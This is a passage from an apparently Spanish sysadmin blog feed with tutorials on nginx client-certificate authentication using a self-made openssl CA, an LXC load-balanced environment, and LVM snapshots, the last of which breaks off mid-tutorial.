&lt;p&gt;En este caso, el truco consiste en hacer trabajar a varias máquinas como si fueran una sola, escondidas en una o varias subredes privadas y poniendo un representante único de todo el sistema (que es el que va a recibir &lt;strong&gt;todas&lt;/strong&gt; las peticiones).&lt;/p&gt;
&lt;p&gt;Este representante suele ser lo que llamamos un &lt;strong&gt;balanceador de carga&lt;/strong&gt;, cuya función es repartir el trabajo entre varios servidores de &lt;strong&gt;backend&lt;/strong&gt;. Al tratarse solo de un "policía de tráfico" su rendimiento es elevado con unas especificaciones modestas, mientras que los servidores de &lt;strong&gt;backend&lt;/strong&gt; consiguen resolver las mismas peticiones por unidad de tiempo; la mejora reside en que pueden haber varios servidores de &lt;strong&gt;backend&lt;/strong&gt; resolviendo peticiones en paralelo.&lt;/p&gt;
&lt;p&gt;Normalmente, estos servidores de &lt;strong&gt;backend&lt;/strong&gt; suelen conectarse a otros servicios (idealmente en otros servidores) para cumplir con sus funciones, por ejemplo con un grupo de servidores de &lt;strong&gt;bases de datos&lt;/strong&gt; dispuestos como un &lt;em&gt;cluster&lt;/em&gt;, que suelen tener una topología propia.&lt;/p&gt;
&lt;p&gt;En este tutorial se va a montar un entorno pequeño de estas características, sirviendo una &lt;em&gt;API&lt;/em&gt; pública en servidores de &lt;strong&gt;backend&lt;/strong&gt;, una aplicación web de administración de los datos de la &lt;em&gt;API&lt;/em&gt; en un servidor de &lt;strong&gt;backoffice&lt;/strong&gt;, y un &lt;em&gt;cluster&lt;/em&gt; de &lt;strong&gt;bases de datos&lt;/strong&gt; representado por una &lt;em&gt;replica set&lt;/em&gt; de MongoDB; todo ello oculto en una red privada y un balanceador usando &lt;em&gt;virtualhosts&lt;/em&gt; para ir a una aplicación u otra según el protocolo usado.&lt;/p&gt;
&lt;p&gt;Esto es lo que propongo montar:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Entorno propuesto" src="http://www.linuxsysadmin.ml/images/entorno_propuesto.png"&gt;&lt;/p&gt;
&lt;p&gt;Para ello, vamos a crear las máquinas virtuales necesarias. En este caso, voy a usar mi servidor de &lt;strong&gt;virtualización con LXC&lt;/strong&gt;, tal como lo monté en &lt;a href="http://www.linuxsysadmin.ml/2015/11/virtualizando-contenedores-lxc-tras-bridge-interno.html"&gt;este artículo&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@lxc:~# lxc-ls -f
NAME        STATE    IPV4        IPV6  AUTOSTART
------------------------------------------------
backend1    RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.3    -     YES
backend2    RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.4    -     YES
backoffice  RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.5    -     YES
frontend    RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2    -     YES
mongo1      RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.6    -     YES
mongo2      RUNNING  &lt;span class="m"&gt;10&lt;/span&gt;.0.0.7    -     YES
root@lxc:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para hacer mas fácil las referencias a las diferentes máquinas, vamos a utilizar sus nombres; como no me apetece montar un servidor DNS, vamos a ponerlas en el fichero &lt;em&gt;/etc/hosts&lt;/em&gt; en todas las máquinas virtuales.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@mongo1:~# cat /etc/hosts
...
10.0.0.2        frontend
10.0.0.3        backend1
10.0.0.4        backend2
10.0.0.5        backoffice
10.0.0.6        mongo1
10.0.0.7        mongo2
...
root@mongo1:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a ir montando todas las máquinas una por una; es laborioso pero no es nada complicado. Las reglas del &lt;em&gt;firewall&lt;/em&gt; también las iremos explicando según el rol de cada máquina.&lt;/p&gt;
&lt;p&gt;El orden de montaje no es importante, pero como queremos ir comprobando en cada caso que va funcionando, se montarán de acuerdo al orden de requisitos:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;El &lt;em&gt;cluster&lt;/em&gt; de &lt;strong&gt;bases de datos&lt;/strong&gt;, que no tiene dependencias.&lt;/li&gt;
&lt;li&gt;Los servidores de &lt;strong&gt;backend&lt;/strong&gt; y &lt;strong&gt;backoffice&lt;/strong&gt; que dependen del &lt;em&gt;cluster&lt;/em&gt; de &lt;strong&gt;bases de datos&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Finalmente, pondremos el servidor de &lt;strong&gt;frontend&lt;/strong&gt;, con los &lt;em&gt;virtualhosts&lt;/em&gt; y el balanceador, lanzando las peticiones contra los &lt;strong&gt;backends&lt;/strong&gt; y el &lt;strong&gt;backoffice&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Sabiendo lo que vamos a montar, solo queda decir: ¡Manos a la obra!&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;</content><category term="linux"></category><category term="entorno"></category><category term="escalable"></category></entry><entry><title>Restringiendo accesos mediante certificados de cliente</title><link href="http://www.linuxsysadmin.ml/2016/02/restringiendo-accesos-mediante-certificados-de-cliente.html" rel="alternate"></link><published>2016-02-22T08:00:00+01:00</published><updated>2016-02-22T08:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-02-22:/2016/02/restringiendo-accesos-mediante-certificados-de-cliente.html</id><summary type="html">&lt;p&gt;De vez en cuando, tenemos algún contenido web o una API que necesita un control de acceso superior. El método mas eficaz del que disponemos hoy en día es la autenticación con certificados SSL cliente, en donde es el cliente el que debe ofrecer un certificado que el servidor validará …&lt;/p&gt;</summary><content type="html">&lt;p&gt;De vez en cuando, tenemos algún contenido web o una API que necesita un control de acceso superior. El método mas eficaz del que disponemos hoy en día es la autenticación con certificados SSL cliente, en donde es el cliente el que debe ofrecer un certificado que el servidor validará.&lt;/p&gt;
&lt;p&gt;Como se trata de proteger contenido web, vamos a necesitar un servidor web, por ejemplo, &lt;strong&gt;nginx&lt;/strong&gt;. De paso, vamos a instalar el paquete &lt;strong&gt;openssl&lt;/strong&gt;, que nos permitirá generar los certificados usados.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# apt-get install nginx-light openssl
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias
Leyendo la información de estado... Hecho
Se instalarán los siguientes paquetes extras:
  nginx-common
Paquetes sugeridos:
  fcgiwrap nginx-doc ssl-cert ca-certificates
Se instalarán los siguientes paquetes NUEVOS:
  nginx-common nginx-light openssl
&lt;span class="m"&gt;0&lt;/span&gt; actualizados, &lt;span class="m"&gt;3&lt;/span&gt; nuevos se instalarán, &lt;span class="m"&gt;0&lt;/span&gt; para eliminar y &lt;span class="m"&gt;0&lt;/span&gt; no actualizados.
Se necesita descargar &lt;span class="m"&gt;1&lt;/span&gt;.126 kB de archivos.
Se utilizarán &lt;span class="m"&gt;2&lt;/span&gt;.148 kB de espacio de disco adicional después de esta operación.
¿Desea continuar? &lt;span class="o"&gt;[&lt;/span&gt;S/n&lt;span class="o"&gt;]&lt;/span&gt; s
...
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Generar el certificado y la clave de la CA&lt;/h2&gt;
&lt;p&gt;Empezaremos por generar la clave de la CA, que va a servir para firmar el certificado que pondremos en el servidor.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# openssl genrsa -des3 -out ca.key &lt;span class="m"&gt;4096&lt;/span&gt;
Generating RSA private key, &lt;span class="m"&gt;4096&lt;/span&gt; bit long modulus
...................................................................++
.++
e is &lt;span class="m"&gt;65537&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;0x10001&lt;span class="o"&gt;)&lt;/span&gt;
Enter pass phrase &lt;span class="k"&gt;for&lt;/span&gt; ca.key:
Verifying - Enter pass phrase &lt;span class="k"&gt;for&lt;/span&gt; ca.key:
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora generamos el certificado de la CA. Lo generamos directamente firmado en un solo paso.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# openssl req -new -x509 -days &lt;span class="m"&gt;365&lt;/span&gt; -key ca.key -out ca.crt -subj &lt;span class="s2"&gt;&amp;quot;/C=ES/ST=Spain/L=Barcelona/O=LinuxSysadmin&amp;quot;&lt;/span&gt;
Enter pass phrase &lt;span class="k"&gt;for&lt;/span&gt; ca.key:
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Generar el certificado para el servidor web&lt;/h2&gt;
&lt;p&gt;Generamos la clave para el certificado del servidor web.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# openssl genrsa -des3 -out server.key &lt;span class="m"&gt;4096&lt;/span&gt;
Generating RSA private key, &lt;span class="m"&gt;4096&lt;/span&gt; bit long modulus
.............................................++
.....................................++
e is &lt;span class="m"&gt;65537&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;0x10001&lt;span class="o"&gt;)&lt;/span&gt;
Enter pass phrase &lt;span class="k"&gt;for&lt;/span&gt; server.key:
Verifying - Enter pass phrase &lt;span class="k"&gt;for&lt;/span&gt; server.key:
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora creamos un certificado para el servidor web. Es importante que el campo &lt;strong&gt;CN&lt;/strong&gt; sea el mismo que el nombre del &lt;em&gt;virtualhost&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# openssl req -new -key server.key -out server.csr -subj &lt;span class="s2"&gt;&amp;quot;/C=ES/ST=Spain/L=Barcelona/O=LinuxSysadmin/CN=private.linuxsysadmin.tk&amp;quot;&lt;/span&gt;
Enter pass phrase &lt;span class="k"&gt;for&lt;/span&gt; server.key:
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y lo firmamos con la clave y el certificado de la CA.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# openssl x509 -req -days &lt;span class="m"&gt;365&lt;/span&gt; -in server.csr -CA ca.crt -CAkey ca.key -set_serial &lt;span class="m"&gt;01&lt;/span&gt; -out server.crt
Signature ok
&lt;span class="nv"&gt;subject&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/C&lt;span class="o"&gt;=&lt;/span&gt;ES/ST&lt;span class="o"&gt;=&lt;/span&gt;Spain/L&lt;span class="o"&gt;=&lt;/span&gt;Barcelona/O&lt;span class="o"&gt;=&lt;/span&gt;LinuxSysadmin/CN&lt;span class="o"&gt;=&lt;/span&gt;private.linuxsysadmin.tk
Getting CA Private Key
Enter pass phrase &lt;span class="k"&gt;for&lt;/span&gt; ca.key:
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: Si la clave está protegida por una passphrase, se va a necesitar introducirla cada vez que se quiera levantar el servidor web. Nos lo podemos ahorrar con unos simples comandos, que dejará la clave como insegura.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mv server.key server.key.secure
root@server:~# openssl rsa -in server.key.secure -out server.key
Enter pass phrase &lt;span class="k"&gt;for&lt;/span&gt; server.key.secure:
writing RSA key
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Generar el certificado cliente&lt;/h2&gt;
&lt;p&gt;Generamos la clave para el certificado del cliente.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# openssl genrsa -des3 -out client.key &lt;span class="m"&gt;1024&lt;/span&gt;
Generating RSA private key, &lt;span class="m"&gt;1024&lt;/span&gt; bit long modulus
...............................++++++
.....................++++++
e is &lt;span class="m"&gt;65537&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;0x10001&lt;span class="o"&gt;)&lt;/span&gt;
Enter pass phrase &lt;span class="k"&gt;for&lt;/span&gt; client.key:
Verifying - Enter pass phrase &lt;span class="k"&gt;for&lt;/span&gt; client.key:
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El siguiente paso consiste en generar una petición de certificado, que posteriormente haremos firmar. El campo &lt;strong&gt;CN&lt;/strong&gt; puede ser recogido por el servidor web y trasladado mediante cabeceras a un hipotético &lt;em&gt;backend&lt;/em&gt;, en caso de hacer un &lt;em&gt;proxy_pass&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# openssl req -new -key client.key -out client.csr -subj &lt;span class="s2"&gt;&amp;quot;/C=ES/ST=Spain/L=Barcelona/O=LinuxSysadmin/CN=Gerard Monells&amp;quot;&lt;/span&gt;
Enter pass phrase &lt;span class="k"&gt;for&lt;/span&gt; client.key:
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Firmamos nuestra petición de certificado con la clave de la CA, obteniendo el certificado final.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# openssl x509 -req -days &lt;span class="m"&gt;365&lt;/span&gt; -in client.csr -CA ca.crt -CAkey ca.key -set_serial &lt;span class="m"&gt;91&lt;/span&gt; -out client.crt
Signature ok
&lt;span class="nv"&gt;subject&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/C&lt;span class="o"&gt;=&lt;/span&gt;ES/ST&lt;span class="o"&gt;=&lt;/span&gt;Spain/L&lt;span class="o"&gt;=&lt;/span&gt;Barcelona/O&lt;span class="o"&gt;=&lt;/span&gt;LinuxSysadmin/CN&lt;span class="o"&gt;=&lt;/span&gt;Gerard Monells
Getting CA Private Key
Enter pass phrase &lt;span class="k"&gt;for&lt;/span&gt; ca.key:
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora queda empaquetar la clave y el certificado en un fichero &lt;em&gt;client.p12&lt;/em&gt; que pueda ser importado en un navegador web.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# openssl pkcs12 -export -in client.crt -inkey client.key -out client.p12 -name &lt;span class="s2"&gt;&amp;quot;LinuxSysadmin&amp;quot;&lt;/span&gt;
Enter pass phrase &lt;span class="k"&gt;for&lt;/span&gt; client.key:
Enter Export Password:
Verifying - Enter Export Password:
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Montando el dominio web&lt;/h2&gt;
&lt;p&gt;Además de necesitar el certificado y la clave servidor, es necesario que el servidor web conozca el certificado de la CA para que pueda verificar el servidor cliente que nos ofrezca el navegador.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# cp server.key /etc/ssl/private/
root@server:~# cp server.crt /etc/ssl/certs/
root@server:~# cp ca.crt /etc/ssl/certs/
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Así quedarían los certificados una vez en su sitio.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# tree /etc/ssl/
/etc/ssl/
├── certs
│   ├── ca.crt
│   └── server.crt
├── openssl.cnf
└── private
    └── server.key

&lt;span class="m"&gt;2&lt;/span&gt; directories, &lt;span class="m"&gt;4&lt;/span&gt; files
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a poner un fichero de configuración en &lt;strong&gt;nginx&lt;/strong&gt;, que va a escuchar por el puerto 443 y con &lt;strong&gt;SSL&lt;/strong&gt; habilitado. Indicamos también donde están los ficheros que servirá el &lt;strong&gt;nginx&lt;/strong&gt;, la localización de los certificados y la necesidad de verificar al cliente mediante certificado contra el certificado de la CA.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# cat /etc/nginx/sites-enabled/private.linuxsysadmin.tk
server &lt;span class="o"&gt;{&lt;/span&gt;
    listen                      &lt;span class="m"&gt;443&lt;/span&gt; ssl&lt;span class="p"&gt;;&lt;/span&gt;
    server_name                 private.linuxsysadmin.tk&lt;span class="p"&gt;;&lt;/span&gt;
    root                        /www&lt;span class="p"&gt;;&lt;/span&gt;

    ssl_certificate             /etc/ssl/certs/server.crt&lt;span class="p"&gt;;&lt;/span&gt;
    ssl_certificate_key         /etc/ssl/private/server.key&lt;span class="p"&gt;;&lt;/span&gt;
    ssl_client_certificate      /etc/ssl/certs/ca.crt&lt;span class="p"&gt;;&lt;/span&gt;
    ssl_verify_client           on&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos verificar que la sintaxis de la configuración es correcta usando el binario de &lt;strong&gt;nginx&lt;/strong&gt; con el parámetro adecuado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# nginx -t
nginx: the configuration file /etc/nginx/nginx.conf syntax is ok
nginx: configuration file /etc/nginx/nginx.conf &lt;span class="nb"&gt;test&lt;/span&gt; is successful
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y sabiendo que es correcto, reiniciamos el servidor web.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# service nginx restart
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Comprobación de funcionamiento&lt;/h2&gt;
&lt;p&gt;Como hemos indicado en la configuración en el &lt;em&gt;document root&lt;/em&gt;, vamos a servir el contenido que se encuentra en &lt;em&gt;/www&lt;/em&gt;. Empezaremos poniendo algún contenido en él.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mkdir /www
root@server:~# &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Private area&amp;quot;&lt;/span&gt; &amp;gt; /www/index.html
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora apuntemos el navegador a la &lt;strong&gt;URL&lt;/strong&gt; del servidor web. Debemos aceptar el certificado autofirmado, puesto que no viene firmado por ninguna autoridad certificadora conocida, por ejemplo, &lt;strong&gt;VeriSign&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Aún así, como no hemos presentado el certificado cliente, el servidor web nos impide el acceso, con una respuesta &lt;strong&gt;HTTP 400&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="2 way SSL access denied" src="http://www.linuxsysadmin.ml/images/2-way-ssl-access-denied.png"&gt;&lt;/p&gt;
&lt;p&gt;Ahora debemos importar el certificado &lt;em&gt;client.p12&lt;/em&gt; en el navegador web. En el caso concreto de &lt;strong&gt;Google Chrome&lt;/strong&gt;, se hace desde el siguiente menú:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Menu &amp;rarr; Settings &amp;rarr; Show advanced settings &amp;rarr; HTTPS/SSL &amp;rarr; Manage certificates &amp;rarr; Your certificates &amp;rarr; Import &amp;rarr; client.p12&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Y ya podemos acceder a nuestro contenido protegido, previa selección del certificado a usar.&lt;/p&gt;
&lt;p&gt;&lt;img alt="2 way SSL certificate" src="http://www.linuxsysadmin.ml/images/2-way-ssl-certificate.png"&gt;&lt;/p&gt;
&lt;p&gt;Y con esto ya tenemos montada la autenticación cliente mediante certificados.&lt;/p&gt;</content><category term="linux"></category><category term="debian"></category><category term="jessie"></category><category term="nginx"></category><category term="2 way ssl"></category><category term="ssl"></category><category term="https"></category><category term="certificado"></category></entry><entry><title>Haciendo snapshots con LVM</title><link href="http://www.linuxsysadmin.ml/2016/02/haciendo-snapshots-con-lvm.html" rel="alternate"></link><published>2016-02-15T08:30:00+01:00</published><updated>2016-02-15T08:30:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2016-02-15:/2016/02/haciendo-snapshots-con-lvm.html</id><summary type="html">&lt;p&gt;Una de las funcionalidades mas implementadas en los sistemas de ficheros de nueva generación es la capacidad de hacer &lt;em&gt;snapshots point-in-time&lt;/em&gt;. Sin embargo, no tenemos que renunciar a la estabilidad de los sistemas de ficheros tradicionales como &lt;strong&gt;ext4&lt;/strong&gt;; otras veces no es posible por requisitos del servicio que debe usarlo …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Una de las funcionalidades mas implementadas en los sistemas de ficheros de nueva generación es la capacidad de hacer &lt;em&gt;snapshots point-in-time&lt;/em&gt;. Sin embargo, no tenemos que renunciar a la estabilidad de los sistemas de ficheros tradicionales como &lt;strong&gt;ext4&lt;/strong&gt;; otras veces no es posible por requisitos del servicio que debe usarlo.&lt;/p&gt;
&lt;p&gt;En este tutorial vamos a demostrar lo fácil que es hacer este tipo de &lt;em&gt;snapshots&lt;/em&gt;, usando como tecnología subyacente el &lt;strong&gt;logical volume manager&lt;/strong&gt;, de ahora en adelante, &lt;strong&gt;LVM&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Los únicos requisitos para seguir esta guía son el paquete &lt;strong&gt;lvm&lt;/strong&gt; y un disco físico sobre el que vamos a construir el &lt;em&gt;volume group&lt;/em&gt; que va a alojar los &lt;em&gt;logical volumes&lt;/em&gt;; al menos van a ser la partición original y algo de espacio para servir como volumen para el &lt;em&gt;snapshot&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Preparación&lt;/h2&gt;
&lt;p&gt;Empezamos instalando los requisitos software:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# apt-get install lvm2
Leyendo lista de paquetes... Hecho
Creando árbol de dependencias
Leyendo la información de estado... Hecho
Se instalarán los siguientes paquetes extras:
  dmeventd libdevmapper-event1.02.1 liblvm2cmd2.02 libreadline5
Paquetes sugeridos:
  thin-provisioning-tools
Se instalarán los siguientes paquetes NUEVOS:
  dmeventd libdevmapper-event1.02.1 liblvm2cmd2.02 libreadline5 lvm2
&lt;span class="m"&gt;0&lt;/span&gt; actualizados, &lt;span class="m"&gt;5&lt;/span&gt; nuevos se instalarán, &lt;span class="m"&gt;0&lt;/span&gt; para eliminar y &lt;span class="m"&gt;0&lt;/span&gt; no actualizados.
Se necesita descargar &lt;span class="m"&gt;1&lt;/span&gt;.530 kB de archivos.
Se utilizarán &lt;span class="m"&gt;3&lt;/span&gt;.898 kB de espacio de disco adicional después de esta operación.
¿Desea continuar? &lt;span class="o"&gt;[&lt;/span&gt;S/n&lt;span class="o"&gt;]&lt;/span&gt; s
...
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Suponiendo que el disco que vamos a usar es &lt;em&gt;/dev/sdb&lt;/em&gt;, vamos a acondicionarlo para que pueda actuar como &lt;em&gt;physical volume&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# pvcreate /dev/sdb
  Physical volume &lt;span class="s2"&gt;&amp;quot;/dev/sdb&amp;quot;&lt;/span&gt; successfully created
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora vamos a usar este &lt;em&gt;physical volume&lt;/em&gt; para crear el &lt;em&gt;volume group&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# vgcreate lvm /dev/sdb
  /proc/devices: No entry &lt;span class="k"&gt;for&lt;/span&gt; device-mapper found
  Volume group &lt;span class="s2"&gt;&amp;quot;lvm&amp;quot;&lt;/span&gt; successfully created
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a sacar un &lt;em&gt;logical volume&lt;/em&gt; para crear el sistema de ficheros que va a ser el objeto del &lt;em&gt;snapshot&lt;/em&gt;. El tamaño del volumen puede ser el que nos convenga, e incluso crecer según sea necesario. De momento, nos basta con 1 GB.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# lvcreate lvm -L 1G -n datos
  Logical volume &lt;span class="s2"&gt;&amp;quot;datos&amp;quot;&lt;/span&gt; created
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Lo formateamos como si de un disco mas se tratara.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mkfs.ext4 /dev/lvm/datos
mke2fs &lt;span class="m"&gt;1&lt;/span&gt;.42.12 &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;29&lt;/span&gt;-Aug-2014&lt;span class="o"&gt;)&lt;/span&gt;
Se está creando El sistema de ficheros con &lt;span class="m"&gt;262144&lt;/span&gt; 4k bloques y &lt;span class="m"&gt;65536&lt;/span&gt; nodos-i

UUID del sistema de ficheros: 1ad4e531-82de-4797-9968-28cb33b3badd
Respaldo del superbloque guardado en los bloques:
        &lt;span class="m"&gt;32768&lt;/span&gt;, &lt;span class="m"&gt;98304&lt;/span&gt;, &lt;span class="m"&gt;163840&lt;/span&gt;, &lt;span class="m"&gt;229376&lt;/span&gt;

Reservando las tablas de grupo: hecho
Escribiendo las tablas de nodos-i: hecho
Creando el fichero de transacciones &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;8192&lt;/span&gt; bloques&lt;span class="o"&gt;)&lt;/span&gt;: hecho
Escribiendo superbloques y la información contable del sistema de ficheros: hecho

root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a asumir que nuestro servicio necesita dejar sus datos en &lt;em&gt;/data&lt;/em&gt;; como no existe, vamos a crearlo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mkdir /data
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El siguiente paso es montar ese volumen en su sitio, en este caso, en &lt;em&gt;/data&lt;/em&gt;. Se deja como ejercicio personal ponerlo en el &lt;em&gt;/etc/fstab&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mount /dev/lvm/datos /data/
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a crear algo de contenido en la carpeta para simular los datos que dejaría el servicio que supuestamente usaría esta carpeta.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt; &amp;gt; /data/a
root@server:~# &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt; &amp;gt; /data/b
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Creación del snapshot&lt;/h2&gt;
&lt;p&gt;Hacer un &lt;em&gt;snapshot&lt;/em&gt; es tan fácil como invocar el binario &lt;strong&gt;lvcreate&lt;/strong&gt; con el parámetro &lt;em&gt;-s&lt;/em&gt;, especificando el tamaño, el nombre y el volumen objetivo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# lvcreate -L 100M -n datos-snap -s /dev/lvm/datos
  Logical volume &lt;span class="s2"&gt;&amp;quot;datos-snap&amp;quot;&lt;/span&gt; created
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El volumen &lt;em&gt;datos-snap&lt;/em&gt; solo contiene las diferencias con el volumen original, así que no necesita tener el mismo tamaño que el original. Sin embargo, si hubiera mas de 100 MB de cambios, este &lt;em&gt;snapshot&lt;/em&gt; quedaría inválido.&lt;/p&gt;
&lt;p&gt;De momento, creo que con 100 MB va a ser suficiente, ya que solo pretendo sacar un fichero comprimido de ese &lt;em&gt;snapshot&lt;/em&gt;, eliminándolo después. Un tamaño seguro habría sido el mismo que el volumen original. Sin embargo, como se trata de otro volumen &lt;strong&gt;LVM&lt;/strong&gt;, podremos extenderla a posteriori con &lt;em&gt;lvextend&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Vamos a analizar el contenido; lo montamos en una carpeta cualquiera para ver su contenido.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mount /dev/lvm/datos-snap /mnt/
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es fácil de verificar que tienen el mismo contenido.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# grep . /data/* /mnt/*
/data/a:1
/data/b:1
/mnt/a:1
/mnt/b:1
root@server:~#
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vamos a continuar simulando que el servicio escribe en el volumen original, por ejemplo, modificando uno de los ficheros.&lt;/p&gt;
